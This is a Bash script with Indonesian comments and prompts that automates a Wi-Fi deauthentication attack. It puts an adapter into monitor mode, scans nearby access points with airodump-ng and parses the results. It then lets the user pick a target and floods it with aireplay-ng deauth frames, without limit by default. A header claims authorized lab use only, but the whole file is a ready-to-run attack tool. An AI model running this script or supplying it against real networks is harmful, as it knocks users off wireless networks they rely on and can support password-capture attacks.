#!/usr/bin/env bash
#
# simulate-attack.sh — modprobe 8814au (opsional) → airmon start → airodump → pilih AP → airmon stop/start → iwconfig → deauth
#
# Authorization: Authorized security research / isolated lab only.
# Scope: Networks you own or have explicit written permission to test.
#
set -euo pipefail

usage() {
  cat <<'EOF'
Usage: sudo bash ./simulate-attack.sh <interface> [deauth_count]

  interface      Antarmuka nirkabel awal, contoh: wlan0 / wlx00c0cab84bcf
  deauth_count   Jumlah frame deauth per burst aireplay-ng (default: 0 = terus sampai Ctrl+C)

Alur (RTL8814AU / lab manual):
  1) modprobe -r 8814au ; modprobe 8814au  (lewati: SKIP_MODPROBE=1)
  2) airmon-ng start <interface> → airodump-ng di iface monitor (fullscreen; Ctrl+C)
  3) Pilih nomor AP dari ringkasan hasil file (CSV / netxml; ESSID ber-koma aman)
  4) airmon-ng stop <interface> ; airmon-ng start <interface>
  5) iwconfig <iface monitor> channel <CH target>
  6) aireplay-ng --deauth <N> -a <BSSID> <iface monitor>

  SKIP_MODPROBE=1  Tanpa reload modul (kartu selain 8814au)
  AIRODUMP_BG=1    Scan diam + timeout SCAN_SECONDS (tanpa UI)
  SCAN_SECONDS=40  Hanya untuk AIRODUMP_BG=1

Contoh:
  sudo bash ./simulate-attack.sh wlx00c0cab84bcf
  sudo SKIP_MODPROBE=1 bash ./simulate-attack.sh wlan0 10
EOF
}

if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
  usage
  exit 0
fi

if [[ $EUID -ne 0 ]]; then
  echo "[!] Jalankan sebagai root (sudo)." >&2
  exit 1
fi

if [[ "$(uname -s)" != "Linux" ]]; then
  echo "[!] Peringatan: airmon-ng/aireplay-ng/iwconfig umumnya untuk Linux + driver mac80211." >&2
  echo "    Di macOS antarmuka ini biasanya tidak berjalan seperti di Kali/Parrot." >&2
fi

for bin in airodump-ng airmon-ng aireplay-ng iwconfig iw; do
  if ! command -v "$bin" >/dev/null 2>&1; then
    echo "[!] Perintah '$bin' tidak ditemukan. Pasang paket aircrack-ng / wireless-tools." >&2
    exit 1
  fi
done

USER_IFACE="${1:-}"
if [[ -z "$USER_IFACE" ]]; then
  usage >&2
  exit 1
fi

if [[ "${SKIP_MODPROBE:-0}" != "1" ]]; then
  echo "[*] Reload driver: modprobe -r 8814au ; modprobe 8814au"
  modprobe -r 8814au 2>/dev/null || true
  if ! modprobe 8814au 2>/dev/null; then
    echo "[!] modprobe 8814au gagal (modul tidak ada?). Lanjut — atau pakai SKIP_MODPROBE=1." >&2
  fi
  echo "[*] Menunggu antarmuka $USER_IFACE aktif kembali…"
  _w=0
  while ! ip link show "$USER_IFACE" &>/dev/null; do
    sleep 1
    ((_w++)) || true
    if ((_w > 25)); then
      echo "[-] Antarmuka '$USER_IFACE' tidak muncul setelah modprobe." >&2
      exit 1
    fi
  done
  sleep 1
else
  if ! ip link show "$USER_IFACE" &>/dev/null; then
    echo "[!] Interface '$USER_IFACE' tidak ada." >&2
    exit 1
  fi
fi

IFACE="$USER_IFACE"
DEAUTH_COUNT="${2:-0}"

# Deteksi nama iface monitor setelah airmon-ng (mac80211: "on [phy0]wlan0mon" / rtl8814au: nama sama + type monitor)
detect_monitor_iface() {
  local log="$1"
  local mon=""
  mon="$(sed -n 's/.* on \[[^]]*\]\([A-Za-z0-9._-]*\).*/\1/p' "$log" | tail -n1)"
  rm -f "$log"
  if [[ -n "$mon" && -d "/sys/class/net/$mon" ]]; then
    echo "$mon"
    return 0
  fi
  if iw dev "$IFACE" info 2>/dev/null | grep -q "type monitor"; then
    echo "$IFACE"
    return 0
  fi
  while read -r line; do
    if [[ "$line" =~ Interface[[:space:]]+([^[:space:]]+) ]]; then
      cur="${BASH_REMATCH[1]}"
    elif [[ "$line" =~ type[[:space:]]+monitor ]]; then
      mon="$cur"
    fi
  done < <(iw dev 2>/dev/null)
  if [[ -n "$mon" && -d "/sys/class/net/$mon" ]]; then
    echo "$mon"
    return 0
  fi
  return 1
}

airmon_do_start() {
  local log mon
  log="$(mktemp)"
  if ! airmon-ng start "$IFACE" >"$log" 2>&1; then
    cat "$log" >&2
    rm -f "$log"
    return 1
  fi
  mon="$(detect_monitor_iface "$log")" || return 1
  printf '%s' "$mon"
}

SCAN_DIR=""
CSV_FILE=""
AIRO_PID=""

cleanup_scan() {
  if [[ -n "${AIRO_PID:-}" ]] && kill -0 "$AIRO_PID" 2>/dev/null; then
    kill "$AIRO_PID" 2>/dev/null || true
    wait "$AIRO_PID" 2>/dev/null || true
  fi
}

trap cleanup_scan EXIT

SCAN_DIR="$(mktemp -d /tmp/wifi_deauth_scan.XXXXXX)"
PREFIX="$SCAN_DIR/scan"
SCAN_SECONDS="${SCAN_SECONDS:-20}"
MON_SCAN=""

echo "[*] airmon-ng start $IFACE (mode monitor untuk scan)"
echo "    Bila channel loncat: hentikan NM/wpa_supplicant dengan 'sudo airmon-ng check kill'."
if ! MON_SCAN="$(airmon_do_start)"; then
  echo "[-] airmon-ng start gagal atau iface monitor tidak terdeteksi." >&2
  exit 1
fi
SCAN_IFACE="$MON_SCAN"
echo "[+] Monitor untuk airodump-ng: $SCAN_IFACE"

run_airodump_capture() {
  # csv + netxml: netxml/Python jadi cadangan bila ESSID berisi koma (merusak split CSV koma tunggal)
  airodump-ng --write-interval 1 --write "$PREFIX" --output-format csv,netxml "$SCAN_IFACE"
}

if [[ "${AIRODUMP_BG:-0}" == "1" ]]; then
  echo "[*] Scan diam (AIRODUMP_BG=1) pada $SCAN_IFACE — Enter lebih awal atau tunggu timeout ${SCAN_SECONDS}s."
  run_airodump_capture >/dev/null 2>&1 &
  AIRO_PID=$!
  read -r -t "$SCAN_SECONDS" -p "[*] Tekan Enter untuk menghentikan scan lebih awal... " _ || true
  cleanup_scan
  AIRO_PID=""
else
  echo "[*] airodump-ng pada $SCAN_IFACE (daftar Wi‑Fi di layar). Tekan Ctrl+C bila cukup."
  set +e
  trap : INT
  run_airodump_capture
  trap - INT
  set -e
fi

# Beri waktu menulis disk setelah Ctrl+C / henti scan
sleep 2

CSV_FILE="$(ls -1t "$PREFIX"*.csv 2>/dev/null | head -n1 || true)"
NETXML="$(ls -1t "$PREFIX"*.kismet.netxml 2>/dev/null | head -n1 || true)"
if [[ (-z "$CSV_FILE" || ! -s "$CSV_FILE") && (-z "$NETXML" || ! -s "$NETXML") ]]; then
  echo "[-] Tidak ada file hasil scan (.csv / .kismet.netxml). Coba scan lebih lama atau cek izin direktori." >&2
  exit 1
fi

# Parse AP: CSV pakai FS ", " (koma+spasi) agar ESSID seperti "2,4G" tidak memecah kolom.
parse_ap_rows_from_csv() {
  [[ -n "$CSV_FILE" && -s "$CSV_FILE" ]] || return 0
  awk '
  BEGIN { FS = ", " }
  function trim(s) {
    gsub(/^[[:space:]]+|[[:space:]]+$/, "", s)
    gsub(/\r/, "", s)
    return s
  }
  # Ringkas ke OPN / WPA / WPA2 / WPA3 / WEP (sumber: Privacy CSV atau string netxml panjang)
  function valid_bssid(s,   n, i, a) {
    n = split(s, a, ":")
    if (n != 6) return 0
    for (i = 1; i <= 6; i++)
      if (a[i] !~ /^[0-9A-Fa-f][0-9A-Fa-f]$/) return 0
    return 1
  }
  function short_enc(s,   u) {
    u = toupper(trim(s))
    if (u == "" || u == "-") return "-"
    if (u == "NONE") return "OPN"
    if (u ~ /^OPN|^OPEN|(^|[^A-Z])OPN([^A-Z]|$)/) return "OPN"
    if (u ~ /WPA3/) return "WPA3"
    if (u ~ /WPA2/) return "WPA2"
    if (u ~ /AES-CCM|AES_CCM|\+AES|SAE/) return "WPA2"
    if (u ~ /802\.1X|WPA2-ENTERPRISE/) return "WPA2"
    if (u ~ /WEP/) return "WEP"
    if (u ~ /TKIP/) return "WPA"
    if (u ~ /WPA\+PSK\/WPA\+AES|WPA\+AES/) return "WPA2"
    if (u ~ /PSK\+CMAC|\+CMAC/) return "WPA2"
    if (u ~ /(^|[^0-9])WPA([^23+]|$)|^WPA$/) return "WPA"
    if (u ~ /WPA/) return "WPA2"
    return substr(u, 1, 4)
  }
  /^[[:space:]]*$/ { next }
  /^BSSID/ {
    in_ap = 1
    essid_col = 14
    ch_col = 4
    pwr_col = 9
    enc_col = 6
    for (i = 1; i <= NF; i++) {
      h = trim($i)
      if (h == "ESSID") essid_col = i
      if (h == "channel") ch_col = i
      if (h == "Power") pwr_col = i
      if (h == "Privacy") enc_col = i
    }
    next
  }
  /^Station MAC/ { in_ap = 0; next }
  in_ap {
    if (NF < ch_col || NF < essid_col) next
    bssid = trim($1)
    if (!valid_bssid(bssid)) next
    ch = trim($ch_col)
    essid = trim($essid_col)
    pwr = (pwr_col <= NF ? trim($pwr_col) : "")
    enc = (enc_col <= NF ? trim($enc_col) : "")
    if (essid == "") essid = "<hidden>"
    if (enc == "") enc = "-"
    else enc = short_enc(enc)
    print bssid "|" ch "|" essid "|" pwr "|" enc
  }
  ' "$CSV_FILE"
}

parse_ap_rows_from_netxml() {
  [[ -n "$NETXML" && -s "$NETXML" ]] || return 0
  command -v python3 >/dev/null 2>&1 || return 0
  python3 - "$NETXML" <<'PY'
import sys
import xml.etree.ElementTree as ET


def local(tag):
    return tag.split("}")[-1] if tag else ""


def find_child(wn, name):
    for el in wn:
        if local(el.tag) == name:
            return el
    return None


def short_enc(raw: str) -> str:
    u = (raw or "").strip().upper()
    if not u or u == "-":
        return "-"
    if u == "NONE":
        return "OPN"
    if u.startswith("OPN") or u.startswith("OPEN") or " OPN " in f" {u} ":
        return "OPN"
    if "WPA3" in u or "SAE" in u:
        return "WPA3"
    if "WPA2" in u:
        return "WPA2"
    if "AES-CCM" in u or "AES_CCM" in u or "+AES" in u:
        return "WPA2"
    if "802.1X" in u or "ENTERPRISE" in u:
        return "WPA2"
    if "WEP" in u:
        return "WEP"
    if "TKIP" in u:
        return "WPA"
    if "WPA+PSK/WPA+AES" in u or "WPA+AES" in u:
        return "WPA2"
    if "PSK+CMAC" in u or "+CMAC" in u:
        return "WPA2"
    if u == "WPA" or ("WPA" in u and "WPA2" not in u and "WPA3" not in u and "AES" not in u):
        return "WPA"
    if "WPA" in u:
        return "WPA2"
    return u[:4]


def main():
    tree = ET.parse(sys.argv[1])
    root = tree.getroot()
    seen = set()
    for wn in root.iter():
        if local(wn.tag) != "wireless-network":
            continue
        b_el = find_child(wn, "BSSID")
        if b_el is None or not (b_el.text or "").strip():
            continue
        bssid = b_el.text.strip()
        if bssid.count(":") != 5:
            continue
        if bssid in seen:
            continue
        seen.add(bssid)
        ch = ""
        c_el = find_child(wn, "channel")
        if c_el is not None and c_el.text:
            ch = c_el.text.strip().split("+", 1)[0].split()[0]
        essid = "<hidden>"
        for el in wn:
            if local(el.tag) != "SSID":
                continue
            for es in el:
                if local(es.tag) != "essid":
                    continue
                t = (es.text or "").strip()
                if t:
                    essid = t.replace("\n", " ")
                    break
            if essid != "<hidden>":
                break
        enc_parts = []
        for el in wn:
            if local(el.tag) != "SSID":
                continue
            for es in el:
                if local(es.tag) != "encryption":
                    continue
                if es.text and es.text.strip():
                    enc_parts.append(es.text.strip().replace("\n", " "))
        raw = "/".join(enc_parts) if enc_parts else ""
        enc = short_enc(raw) if raw else "-"
        print(f"{bssid}|{ch}|{essid}||{enc}")


if __name__ == "__main__":
    main()
PY
}

ROWS=()
while IFS= read -r line; do
  [[ -n "$line" ]] && ROWS+=("$line")
done < <(parse_ap_rows_from_csv)

if [[ ${#ROWS[@]} -eq 0 ]]; then
  while IFS= read -r line; do
    [[ -n "$line" ]] && ROWS+=("$line")
  done < <(parse_ap_rows_from_netxml)
fi

if [[ ${#ROWS[@]} -eq 0 ]]; then
  echo "[-] Tidak ada AP terbaca dari hasil scan (CSV/netxml)." >&2
  echo "    Penyebab umum: ESSID ber-koma (perbaikan FS), atau file belum sempat ditulis — coba tunggu ~2s setelah Ctrl+C (sudah dijeda)." >&2
  echo "    Pastikan python3 ada untuk cadangan netxml. Atur AIRODUMP_BG=1 SCAN_SECONDS=60." >&2
  exit 1
fi

echo ""
echo "[+] Ringkasan AP (pilih nomor — ENC singkat: OPN / WPA / WPA2 / WPA3 / WEP):"
echo "     #   PWR   CH  ENC   ESSID                           BSSID"
i=1
for row in "${ROWS[@]}"; do
  IFS='|' read -r bssid ch essid pwr enc <<<"$row"
  printf "    %2d) %-5s %-4s %-5s %-30s %s\n" "$i" "${pwr:--}" "$ch" "${enc:--}" "$essid" "$bssid"
  ((i++)) || true
done

echo ""
read -r -p "[?] Nomor target dari daftar di atas: " choice
if ! [[ "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#ROWS[@]} )); then
  echo "[-] Pilihan tidak valid." >&2
  exit 1
fi

SEL="${ROWS[$((choice - 1))]}"
IFS='|' read -r TARGET_BSSID TARGET_CHANNEL TARGET_ESSID _TARGET_PWR TARGET_ENC <<<"$SEL"

echo "[+] Target: $TARGET_ESSID | BSSID=$TARGET_BSSID | CH=$TARGET_CHANNEL | ENC=${TARGET_ENC:--}"

echo "[*] airmon-ng stop $IFACE"
airmon-ng stop "$IFACE" >/dev/null 2>&1 || true
if [[ -n "$MON_SCAN" && "$MON_SCAN" != "$IFACE" ]]; then
  airmon-ng stop "$MON_SCAN" >/dev/null 2>&1 || true
fi
sleep 1

echo "[*] airmon-ng start $IFACE (sebelum deauth, seperti alur manual)"
if ! MON_IFACE="$(airmon_do_start)"; then
  echo "[-] airmon-ng start kedua gagal atau monitor tidak terdeteksi." >&2
  exit 1
fi
echo "[+] Interface monitor untuk deauth: $MON_IFACE"

echo "[*] iwconfig $MON_IFACE channel $TARGET_CHANNEL"
if ! iwconfig "$MON_IFACE" channel "$TARGET_CHANNEL" 2>/dev/null; then
  echo "[!] iwconfig set channel gagal, mencoba: iw dev $MON_IFACE set channel $TARGET_CHANNEL"
  iw dev "$MON_IFACE" set channel "$TARGET_CHANNEL"
fi

echo ""
if [[ "$DEAUTH_COUNT" == "0" ]]; then
  echo "[!] Deauth count=0 → aireplay-ng mengirim terus sampai Ctrl+C."
else
  echo "[*] Mengirim $DEAUTH_COUNT frame deauth per burst (aireplay-ng -0)."
fi
echo "[*] aireplay-ng --deauth $DEAUTH_COUNT -a $TARGET_BSSID $MON_IFACE"
echo ""

aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$MON_IFACE"

echo ""
echo "[*] Selesai. Membersihkan: airmon-ng stop $MON_IFACE ; airmon-ng stop $IFACE"
airmon-ng stop "$MON_IFACE" >/dev/null 2>&1 || true
airmon-ng stop "$IFACE" >/dev/null 2>&1 || true

rm -rf "$SCAN_DIR"
trap - EXIT
